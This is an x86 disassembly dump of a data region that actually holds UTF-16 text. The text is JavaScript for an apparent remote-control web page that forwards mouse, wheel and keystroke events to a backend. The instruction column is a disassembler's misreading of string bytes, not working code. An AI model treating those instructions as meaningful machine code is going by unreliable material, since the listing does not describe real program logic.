  406eb5:	74 00                	je     0x406eb7
  406eb7:	4c                   	dec    %esp
  406eb8:	00 69 00             	add    %ch,0x0(%ecx)
  406ebb:	73 00                	jae    0x406ebd
  406ebd:	74 00                	je     0x406ebf
  406ebf:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406ec3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406ec7:	28 00                	sub    %al,(%eax)
  406ec9:	27                   	daa
  406eca:	00 6d 00             	add    %ch,0x0(%ebp)
  406ecd:	6f                   	outsl  %ds:(%esi),(%dx)
  406ece:	00 75 00             	add    %dh,0x0(%ebp)
  406ed1:	73 00                	jae    0x406ed3
  406ed3:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  406ed7:	70 00                	jo     0x406ed9
  406ed9:	27                   	daa
  406eda:	00 2c 00             	add    %ch,(%eax,%eax,1)
  406edd:	20 00                	and    %al,(%eax)
  406edf:	20 00                	and    %al,(%eax)
  406ee1:	20 00                	and    %al,(%eax)
  406ee3:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  406ee7:	6e                   	outsb  %ds:(%esi),(%dx)
  406ee8:	00 63 00             	add    %ah,0x0(%ebx)
  406eeb:	74 00                	je     0x406eed
  406eed:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406ef3:	28 00                	sub    %al,(%eax)
  406ef5:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  406ef9:	29 00                	sub    %eax,(%eax)
  406efb:	7b 00                	jnp    0x406efd
  406efd:	20 00                	and    %al,(%eax)
  406eff:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  406f03:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406f07:	72 00                	jb     0x406f09
  406f09:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  406f0d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406f11:	74 00                	je     0x406f13
  406f13:	44                   	inc    %esp
  406f14:	00 65 00             	add    %ah,0x0(%ebp)
  406f17:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  406f1b:	75 00                	jne    0x406f1d
  406f1d:	6c                   	insb   (%dx),%es:(%edi)
  406f1e:	00 74 00 28          	add    %dh,0x28(%eax,%eax,1)
  406f22:	00 29                	add    %ch,(%ecx)
  406f24:	00 3b                	add    %bh,(%ebx)
  406f26:	00 20                	add    %ah,(%eax)
  406f28:	00 76 00             	add    %dh,0x0(%esi)
  406f2b:	61                   	popa
  406f2c:	00 72 00             	add    %dh,0x0(%edx)
  406f2f:	20 00                	and    %al,(%eax)
  406f31:	70 00                	jo     0x406f33
  406f33:	3d 00 72 00 65       	cmp    $0x65007200,%eax
  406f38:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  406f3c:	00 6f 00             	add    %ch,0x0(%edi)
  406f3f:	73 00                	jae    0x406f41
  406f41:	28 00                	sub    %al,(%eax)
  406f43:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  406f47:	29 00                	sub    %eax,(%eax)
  406f49:	3b 00                	cmp    (%eax),%eax
  406f4b:	20 00                	and    %al,(%eax)
  406f4d:	70 00                	jo     0x406f4f
  406f4f:	6f                   	outsl  %ds:(%esi),(%dx)
  406f50:	00 73 00             	add    %dh,0x0(%ebx)
  406f53:	74 00                	je     0x406f55
  406f55:	28 00                	sub    %al,(%eax)
  406f57:	7b 00                	jnp    0x406f59
  406f59:	74 00                	je     0x406f5b
  406f5b:	79 00                	jns    0x406f5d
  406f5d:	70 00                	jo     0x406f5f
  406f5f:	65 00 3a             	add    %bh,%gs:(%edx)
  406f62:	00 27                	add    %ah,(%edi)
  406f64:	00 6d 00             	add    %ch,0x0(%ebp)
  406f67:	6f                   	outsl  %ds:(%esi),(%dx)
  406f68:	00 75 00             	add    %dh,0x0(%ebp)
  406f6b:	73 00                	jae    0x406f6d
  406f6d:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  406f71:	70 00                	jo     0x406f73
  406f73:	27                   	daa
  406f74:	00 2c 00             	add    %ch,(%eax,%eax,1)
  406f77:	78 00                	js     0x406f79
  406f79:	3a 00                	cmp    (%eax),%al
  406f7b:	70 00                	jo     0x406f7d
  406f7d:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  406f81:	2c 00                	sub    $0x0,%al
  406f83:	79 00                	jns    0x406f85
  406f85:	3a 00                	cmp    (%eax),%al
  406f87:	70 00                	jo     0x406f89
  406f89:	2e 00 79 00          	add    %bh,%cs:0x0(%ecx)
  406f8d:	2c 00                	sub    $0x0,%al
  406f8f:	62 00                	bound  %eax,(%eax)
  406f91:	75 00                	jne    0x406f93
  406f93:	74 00                	je     0x406f95
  406f95:	74 00                	je     0x406f97
  406f97:	6f                   	outsl  %ds:(%esi),(%dx)
  406f98:	00 6e 00             	add    %ch,0x0(%esi)
  406f9b:	3a 00                	cmp    (%eax),%al
  406f9d:	62 00                	bound  %eax,(%eax)
  406f9f:	74 00                	je     0x406fa1
  406fa1:	6e                   	outsb  %ds:(%esi),(%dx)
  406fa2:	00 28                	add    %ch,(%eax)
  406fa4:	00 65 00             	add    %ah,0x0(%ebp)
  406fa7:	76 00                	jbe    0x406fa9
  406fa9:	29 00                	sub    %eax,(%eax)
  406fab:	7d 00                	jge    0x406fad
  406fad:	29 00                	sub    %eax,(%eax)
  406faf:	3b 00                	cmp    (%eax),%eax
  406fb1:	20 00                	and    %al,(%eax)
  406fb3:	7d 00                	jge    0x406fb5
  406fb5:	29 00                	sub    %eax,(%eax)
  406fb7:	3b 00                	cmp    (%eax),%eax
  406fb9:	0a 00                	or     (%eax),%al
  406fbb:	20 00                	and    %al,(%eax)
  406fbd:	20 00                	and    %al,(%eax)
  406fbf:	69 00 6d 00 67 00    	imul   $0x67006d,(%eax),%eax
  406fc5:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406fc9:	64 00 64 00 45       	add    %ah,%fs:0x45(%eax,%eax,1)
  406fce:	00 76 00             	add    %dh,0x0(%esi)
  406fd1:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406fd5:	74 00                	je     0x406fd7
  406fd7:	4c                   	dec    %esp
  406fd8:	00 69 00             	add    %ch,0x0(%ecx)
  406fdb:	73 00                	jae    0x406fdd
  406fdd:	74 00                	je     0x406fdf
  406fdf:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406fe3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406fe7:	28 00                	sub    %al,(%eax)
  406fe9:	27                   	daa
  406fea:	00 6d 00             	add    %ch,0x0(%ebp)
  406fed:	6f                   	outsl  %ds:(%esi),(%dx)
  406fee:	00 75 00             	add    %dh,0x0(%ebp)
  406ff1:	73 00                	jae    0x406ff3
  406ff3:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  406ff7:	6f                   	outsl  %ds:(%esi),(%dx)
  406ff8:	00 76 00             	add    %dh,0x0(%esi)
  406ffb:	65 00 27             	add    %ah,%gs:(%edi)
  406ffe:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407001:	20 00                	and    %al,(%eax)
  407003:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  407007:	6e                   	outsb  %ds:(%esi),(%dx)
  407008:	00 63 00             	add    %ah,0x0(%ebx)
  40700b:	74 00                	je     0x40700d
  40700d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407013:	28 00                	sub    %al,(%eax)
  407015:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407019:	29 00                	sub    %eax,(%eax)
  40701b:	7b 00                	jnp    0x40701d
  40701d:	20 00                	and    %al,(%eax)
  40701f:	76 00                	jbe    0x407021
  407021:	61                   	popa
  407022:	00 72 00             	add    %dh,0x0(%edx)
  407025:	20 00                	and    %al,(%eax)
  407027:	70 00                	jo     0x407029
  407029:	3d 00 72 00 65       	cmp    $0x65007200,%eax
  40702e:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  407032:	00 6f 00             	add    %ch,0x0(%edi)
  407035:	73 00                	jae    0x407037
  407037:	28 00                	sub    %al,(%eax)
  407039:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40703d:	29 00                	sub    %eax,(%eax)
  40703f:	3b 00                	cmp    (%eax),%eax
  407041:	20 00                	and    %al,(%eax)
  407043:	70 00                	jo     0x407045
  407045:	6f                   	outsl  %ds:(%esi),(%dx)
  407046:	00 73 00             	add    %dh,0x0(%ebx)
  407049:	74 00                	je     0x40704b
  40704b:	28 00                	sub    %al,(%eax)
  40704d:	7b 00                	jnp    0x40704f
  40704f:	74 00                	je     0x407051
  407051:	79 00                	jns    0x407053
  407053:	70 00                	jo     0x407055
  407055:	65 00 3a             	add    %bh,%gs:(%edx)
  407058:	00 27                	add    %ah,(%edi)
  40705a:	00 6d 00             	add    %ch,0x0(%ebp)
  40705d:	6f                   	outsl  %ds:(%esi),(%dx)
  40705e:	00 75 00             	add    %dh,0x0(%ebp)
  407061:	73 00                	jae    0x407063
  407063:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407067:	6f                   	outsl  %ds:(%esi),(%dx)
  407068:	00 76 00             	add    %dh,0x0(%esi)
  40706b:	65 00 27             	add    %ah,%gs:(%edi)
  40706e:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407071:	78 00                	js     0x407073
  407073:	3a 00                	cmp    (%eax),%al
  407075:	70 00                	jo     0x407077
  407077:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40707b:	2c 00                	sub    $0x0,%al
  40707d:	79 00                	jns    0x40707f
  40707f:	3a 00                	cmp    (%eax),%al
  407081:	70 00                	jo     0x407083
  407083:	2e 00 79 00          	add    %bh,%cs:0x0(%ecx)
  407087:	7d 00                	jge    0x407089
  407089:	29 00                	sub    %eax,(%eax)
  40708b:	3b 00                	cmp    (%eax),%eax
  40708d:	20 00                	and    %al,(%eax)
  40708f:	7d 00                	jge    0x407091
  407091:	29 00                	sub    %eax,(%eax)
  407093:	3b 00                	cmp    (%eax),%eax
  407095:	0a 00                	or     (%eax),%al
  407097:	20 00                	and    %al,(%eax)
  407099:	20 00                	and    %al,(%eax)
  40709b:	69 00 6d 00 67 00    	imul   $0x67006d,(%eax),%eax
  4070a1:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4070a5:	64 00 64 00 45       	add    %ah,%fs:0x45(%eax,%eax,1)
  4070aa:	00 76 00             	add    %dh,0x0(%esi)
  4070ad:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4070b1:	74 00                	je     0x4070b3
  4070b3:	4c                   	dec    %esp
  4070b4:	00 69 00             	add    %ch,0x0(%ecx)
  4070b7:	73 00                	jae    0x4070b9
  4070b9:	74 00                	je     0x4070bb
  4070bb:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4070bf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4070c3:	28 00                	sub    %al,(%eax)
  4070c5:	27                   	daa
  4070c6:	00 63 00             	add    %ah,0x0(%ebx)
  4070c9:	6c                   	insb   (%dx),%es:(%edi)
  4070ca:	00 69 00             	add    %ch,0x0(%ecx)
  4070cd:	63 00                	arpl   %eax,(%eax)
  4070cf:	6b 00 27             	imul   $0x27,(%eax),%eax
  4070d2:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4070d5:	20 00                	and    %al,(%eax)
  4070d7:	20 00                	and    %al,(%eax)
  4070d9:	20 00                	and    %al,(%eax)
  4070db:	20 00                	and    %al,(%eax)
  4070dd:	20 00                	and    %al,(%eax)
  4070df:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  4070e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4070e4:	00 63 00             	add    %ah,0x0(%ebx)
  4070e7:	74 00                	je     0x4070e9
  4070e9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4070ef:	28 00                	sub    %al,(%eax)
  4070f1:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4070f5:	29 00                	sub    %eax,(%eax)
  4070f7:	7b 00                	jnp    0x4070f9
  4070f9:	20 00                	and    %al,(%eax)
  4070fb:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4070ff:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  407103:	72 00                	jb     0x407105
  407105:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407109:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40710d:	74 00                	je     0x40710f
  40710f:	44                   	inc    %esp
  407110:	00 65 00             	add    %ah,0x0(%ebp)
  407113:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  407117:	75 00                	jne    0x407119
  407119:	6c                   	insb   (%dx),%es:(%edi)
  40711a:	00 74 00 28          	add    %dh,0x28(%eax,%eax,1)
  40711e:	00 29                	add    %ch,(%ecx)
  407120:	00 3b                	add    %bh,(%ebx)
  407122:	00 20                	add    %ah,(%eax)
  407124:	00 76 00             	add    %dh,0x0(%esi)
  407127:	61                   	popa
  407128:	00 72 00             	add    %dh,0x0(%edx)
  40712b:	20 00                	and    %al,(%eax)
  40712d:	70 00                	jo     0x40712f
  40712f:	3d 00 72 00 65       	cmp    $0x65007200,%eax
  407134:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  407138:	00 6f 00             	add    %ch,0x0(%edi)
  40713b:	73 00                	jae    0x40713d
  40713d:	28 00                	sub    %al,(%eax)
  40713f:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407143:	29 00                	sub    %eax,(%eax)
  407145:	3b 00                	cmp    (%eax),%eax
  407147:	20 00                	and    %al,(%eax)
  407149:	70 00                	jo     0x40714b
  40714b:	6f                   	outsl  %ds:(%esi),(%dx)
  40714c:	00 73 00             	add    %dh,0x0(%ebx)
  40714f:	74 00                	je     0x407151
  407151:	28 00                	sub    %al,(%eax)
  407153:	7b 00                	jnp    0x407155
  407155:	74 00                	je     0x407157
  407157:	79 00                	jns    0x407159
  407159:	70 00                	jo     0x40715b
  40715b:	65 00 3a             	add    %bh,%gs:(%edx)
  40715e:	00 27                	add    %ah,(%edi)
  407160:	00 63 00             	add    %ah,0x0(%ebx)
  407163:	6c                   	insb   (%dx),%es:(%edi)
  407164:	00 69 00             	add    %ch,0x0(%ecx)
  407167:	63 00                	arpl   %eax,(%eax)
  407169:	6b 00 27             	imul   $0x27,(%eax),%eax
  40716c:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40716f:	78 00                	js     0x407171
  407171:	3a 00                	cmp    (%eax),%al
  407173:	70 00                	jo     0x407175
  407175:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  407179:	2c 00                	sub    $0x0,%al
  40717b:	79 00                	jns    0x40717d
  40717d:	3a 00                	cmp    (%eax),%al
  40717f:	70 00                	jo     0x407181
  407181:	2e 00 79 00          	add    %bh,%cs:0x0(%ecx)
  407185:	2c 00                	sub    $0x0,%al
  407187:	62 00                	bound  %eax,(%eax)
  407189:	75 00                	jne    0x40718b
  40718b:	74 00                	je     0x40718d
  40718d:	74 00                	je     0x40718f
  40718f:	6f                   	outsl  %ds:(%esi),(%dx)
  407190:	00 6e 00             	add    %ch,0x0(%esi)
  407193:	3a 00                	cmp    (%eax),%al
  407195:	62 00                	bound  %eax,(%eax)
  407197:	74 00                	je     0x407199
  407199:	6e                   	outsb  %ds:(%esi),(%dx)
  40719a:	00 28                	add    %ch,(%eax)
  40719c:	00 65 00             	add    %ah,0x0(%ebp)
  40719f:	76 00                	jbe    0x4071a1
  4071a1:	29 00                	sub    %eax,(%eax)
  4071a3:	7d 00                	jge    0x4071a5
  4071a5:	29 00                	sub    %eax,(%eax)
  4071a7:	3b 00                	cmp    (%eax),%eax
  4071a9:	20 00                	and    %al,(%eax)
  4071ab:	7d 00                	jge    0x4071ad
  4071ad:	29 00                	sub    %eax,(%eax)
  4071af:	3b 00                	cmp    (%eax),%eax
  4071b1:	0a 00                	or     (%eax),%al
  4071b3:	20 00                	and    %al,(%eax)
  4071b5:	20 00                	and    %al,(%eax)
  4071b7:	69 00 6d 00 67 00    	imul   $0x67006d,(%eax),%eax
  4071bd:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  4071c1:	64 00 64 00 45       	add    %ah,%fs:0x45(%eax,%eax,1)
  4071c6:	00 76 00             	add    %dh,0x0(%esi)
  4071c9:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4071cd:	74 00                	je     0x4071cf
  4071cf:	4c                   	dec    %esp
  4071d0:	00 69 00             	add    %ch,0x0(%ecx)
  4071d3:	73 00                	jae    0x4071d5
  4071d5:	74 00                	je     0x4071d7
  4071d7:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4071db:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4071df:	28 00                	sub    %al,(%eax)
  4071e1:	27                   	daa
  4071e2:	00 63 00             	add    %ah,0x0(%ebx)
  4071e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4071e6:	00 6e 00             	add    %ch,0x0(%esi)
  4071e9:	74 00                	je     0x4071eb
  4071eb:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  4071ef:	74 00                	je     0x4071f1
  4071f1:	6d                   	insl   (%dx),%es:(%edi)
  4071f2:	00 65 00             	add    %ah,0x0(%ebp)
  4071f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4071f6:	00 75 00             	add    %dh,0x0(%ebp)
  4071f9:	27                   	daa
  4071fa:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4071fd:	20 00                	and    %al,(%eax)
  4071ff:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  407203:	6e                   	outsb  %ds:(%esi),(%dx)
  407204:	00 63 00             	add    %ah,0x0(%ebx)
  407207:	74 00                	je     0x407209
  407209:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40720f:	28 00                	sub    %al,(%eax)
  407211:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407215:	29 00                	sub    %eax,(%eax)
  407217:	7b 00                	jnp    0x407219
  407219:	20 00                	and    %al,(%eax)
  40721b:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40721f:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  407223:	72 00                	jb     0x407225
  407225:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407229:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40722d:	74 00                	je     0x40722f
  40722f:	44                   	inc    %esp
  407230:	00 65 00             	add    %ah,0x0(%ebp)
  407233:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  407237:	75 00                	jne    0x407239
  407239:	6c                   	insb   (%dx),%es:(%edi)
  40723a:	00 74 00 28          	add    %dh,0x28(%eax,%eax,1)
  40723e:	00 29                	add    %ch,(%ecx)
  407240:	00 3b                	add    %bh,(%ebx)
  407242:	00 20                	add    %ah,(%eax)
  407244:	00 7d 00             	add    %bh,0x0(%ebp)
  407247:	29 00                	sub    %eax,(%eax)
  407249:	3b 00                	cmp    (%eax),%eax
  40724b:	0a 00                	or     (%eax),%al
  40724d:	20 00                	and    %al,(%eax)
  40724f:	20 00                	and    %al,(%eax)
  407251:	69 00 6d 00 67 00    	imul   $0x67006d,(%eax),%eax
  407257:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  40725b:	64 00 64 00 45       	add    %ah,%fs:0x45(%eax,%eax,1)
  407260:	00 76 00             	add    %dh,0x0(%esi)
  407263:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407267:	74 00                	je     0x407269
  407269:	4c                   	dec    %esp
  40726a:	00 69 00             	add    %ch,0x0(%ecx)
  40726d:	73 00                	jae    0x40726f
  40726f:	74 00                	je     0x407271
  407271:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407275:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407279:	28 00                	sub    %al,(%eax)
  40727b:	27                   	daa
  40727c:	00 77 00             	add    %dh,0x0(%edi)
  40727f:	68 00 65 00 65       	push   $0x65006500
  407284:	00 6c 00 27          	add    %ch,0x27(%eax,%eax,1)
  407288:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40728b:	20 00                	and    %al,(%eax)
  40728d:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  407291:	6e                   	outsb  %ds:(%esi),(%dx)
  407292:	00 63 00             	add    %ah,0x0(%ebx)
  407295:	74 00                	je     0x407297
  407297:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40729d:	28 00                	sub    %al,(%eax)
  40729f:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4072a3:	29 00                	sub    %eax,(%eax)
  4072a5:	7b 00                	jnp    0x4072a7
  4072a7:	20 00                	and    %al,(%eax)
  4072a9:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4072ad:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4072b1:	72 00                	jb     0x4072b3
  4072b3:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4072b7:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4072bb:	74 00                	je     0x4072bd
  4072bd:	44                   	inc    %esp
  4072be:	00 65 00             	add    %ah,0x0(%ebp)
  4072c1:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4072c5:	75 00                	jne    0x4072c7
  4072c7:	6c                   	insb   (%dx),%es:(%edi)
  4072c8:	00 74 00 28          	add    %dh,0x28(%eax,%eax,1)
  4072cc:	00 29                	add    %ch,(%ecx)
  4072ce:	00 3b                	add    %bh,(%ebx)
  4072d0:	00 20                	add    %ah,(%eax)
  4072d2:	00 76 00             	add    %dh,0x0(%esi)
  4072d5:	61                   	popa
  4072d6:	00 72 00             	add    %dh,0x0(%edx)
  4072d9:	20 00                	and    %al,(%eax)
  4072db:	70 00                	jo     0x4072dd
  4072dd:	3d 00 72 00 65       	cmp    $0x65007200,%eax
  4072e2:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  4072e6:	00 6f 00             	add    %ch,0x0(%edi)
  4072e9:	73 00                	jae    0x4072eb
  4072eb:	28 00                	sub    %al,(%eax)
  4072ed:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4072f1:	29 00                	sub    %eax,(%eax)
  4072f3:	3b 00                	cmp    (%eax),%eax
  4072f5:	20 00                	and    %al,(%eax)
  4072f7:	70 00                	jo     0x4072f9
  4072f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4072fa:	00 73 00             	add    %dh,0x0(%ebx)
  4072fd:	74 00                	je     0x4072ff
  4072ff:	28 00                	sub    %al,(%eax)
  407301:	7b 00                	jnp    0x407303
  407303:	74 00                	je     0x407305
  407305:	79 00                	jns    0x407307
  407307:	70 00                	jo     0x407309
  407309:	65 00 3a             	add    %bh,%gs:(%edx)
  40730c:	00 27                	add    %ah,(%edi)
  40730e:	00 73 00             	add    %dh,0x0(%ebx)
  407311:	63 00                	arpl   %eax,(%eax)
  407313:	72 00                	jb     0x407315
  407315:	6f                   	outsl  %ds:(%esi),(%dx)
  407316:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40731a:	00 27                	add    %ah,(%edi)
  40731c:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40731f:	78 00                	js     0x407321
  407321:	3a 00                	cmp    (%eax),%al
  407323:	70 00                	jo     0x407325
  407325:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  407329:	2c 00                	sub    $0x0,%al
  40732b:	79 00                	jns    0x40732d
  40732d:	3a 00                	cmp    (%eax),%al
  40732f:	70 00                	jo     0x407331
  407331:	2e 00 79 00          	add    %bh,%cs:0x0(%ecx)
  407335:	2c 00                	sub    $0x0,%al
  407337:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40733b:	6c                   	insb   (%dx),%es:(%edi)
  40733c:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  407340:	00 59 00             	add    %bl,0x0(%ecx)
  407343:	3a 00                	cmp    (%eax),%al
  407345:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407349:	2e 00 64 00 65       	add    %ah,%cs:0x65(%eax,%eax,1)
  40734e:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  407352:	00 61 00             	add    %ah,0x0(%ecx)
  407355:	59                   	pop    %ecx
  407356:	00 7d 00             	add    %bh,0x0(%ebp)
  407359:	29 00                	sub    %eax,(%eax)
  40735b:	3b 00                	cmp    (%eax),%eax
  40735d:	20 00                	and    %al,(%eax)
  40735f:	7d 00                	jge    0x407361
  407361:	2c 00                	sub    $0x0,%al
  407363:	20 00                	and    %al,(%eax)
  407365:	7b 00                	jnp    0x407367
  407367:	70 00                	jo     0x407369
  407369:	61                   	popa
  40736a:	00 73 00             	add    %dh,0x0(%ebx)
  40736d:	73 00                	jae    0x40736f
  40736f:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  407375:	3a 00                	cmp    (%eax),%al
  407377:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40737b:	6c                   	insb   (%dx),%es:(%edi)
  40737c:	00 73 00             	add    %dh,0x0(%ebx)
  40737f:	65 00 7d 00          	add    %bh,%gs:0x0(%ebp)
  407383:	29 00                	sub    %eax,(%eax)
  407385:	3b 00                	cmp    (%eax),%eax
  407387:	0a 00                	or     (%eax),%al
  407389:	0a 00                	or     (%eax),%al
  40738b:	20 00                	and    %al,(%eax)
  40738d:	20 00                	and    %al,(%eax)
  40738f:	77 00                	ja     0x407391
  407391:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407397:	6f                   	outsl  %ds:(%esi),(%dx)
  407398:	00 77 00             	add    %dh,0x0(%edi)
  40739b:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  40739f:	64 00 64 00 45       	add    %ah,%fs:0x45(%eax,%eax,1)
  4073a4:	00 76 00             	add    %dh,0x0(%esi)
  4073a7:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4073ab:	74 00                	je     0x4073ad
  4073ad:	4c                   	dec    %esp
  4073ae:	00 69 00             	add    %ch,0x0(%ecx)
  4073b1:	73 00                	jae    0x4073b3
  4073b3:	74 00                	je     0x4073b5
  4073b5:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4073b9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4073bd:	28 00                	sub    %al,(%eax)
  4073bf:	27                   	daa
  4073c0:	00 6b 00             	add    %ch,0x0(%ebx)
  4073c3:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4073c7:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  4073cb:	77 00                	ja     0x4073cd
  4073cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4073ce:	00 27                	add    %ah,(%edi)
  4073d0:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4073d3:	20 00                	and    %al,(%eax)
  4073d5:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  4073d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4073da:	00 63 00             	add    %ah,0x0(%ebx)
  4073dd:	74 00                	je     0x4073df
  4073df:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4073e5:	28 00                	sub    %al,(%eax)
  4073e7:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4073eb:	29 00                	sub    %eax,(%eax)
  4073ed:	7b 00                	jnp    0x4073ef
  4073ef:	20 00                	and    %al,(%eax)
  4073f1:	69 00 66 00 28 00    	imul   $0x280066,(%eax),%eax
  4073f7:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  4073fb:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4073ff:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  407403:	20 00                	and    %al,(%eax)
  407405:	26 00 26             	add    %ah,%es:(%esi)
  407408:	00 20                	add    %ah,(%eax)
  40740a:	00 65 00             	add    %ah,0x0(%ebp)
  40740d:	76 00                	jbe    0x40740f
  40740f:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  407413:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  407417:	2e 00 6c 00 65       	add    %ch,%cs:0x65(%eax,%eax,1)
  40741c:	00 6e 00             	add    %ch,0x0(%esi)
  40741f:	67 00 74 00          	add    %dh,0x0(%si)
  407423:	68 00 3d 00 3d       	push   $0x3d003d00
  407428:	00 3d 00 31 00 29    	add    %bh,0x29003100
  40742e:	00 7b 00             	add    %bh,0x0(%ebx)
  407431:	20 00                	and    %al,(%eax)
  407433:	70 00                	jo     0x407435
  407435:	6f                   	outsl  %ds:(%esi),(%dx)
  407436:	00 73 00             	add    %dh,0x0(%ebx)
  407439:	74 00                	je     0x40743b
  40743b:	28 00                	sub    %al,(%eax)
  40743d:	7b 00                	jnp    0x40743f
  40743f:	74 00                	je     0x407441
  407441:	79 00                	jns    0x407443
  407443:	70 00                	jo     0x407445
  407445:	65 00 3a             	add    %bh,%gs:(%edx)
  407448:	00 27                	add    %ah,(%edi)
  40744a:	00 63 00             	add    %ah,0x0(%ebx)
  40744d:	68 00 61 00 72       	push   $0x72006100
  407452:	00 27                	add    %ah,(%edi)
  407454:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407457:	63 00                	arpl   %eax,(%eax)
  407459:	68 00 61 00 72       	push   $0x72006100
  40745e:	00 3a                	add    %bh,(%edx)
  407460:	00 65 00             	add    %ah,0x0(%ebp)
  407463:	76 00                	jbe    0x407465
  407465:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  407469:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40746d:	7d 00                	jge    0x40746f
  40746f:	29 00                	sub    %eax,(%eax)
  407471:	3b 00                	cmp    (%eax),%eax
  407473:	20 00                	and    %al,(%eax)
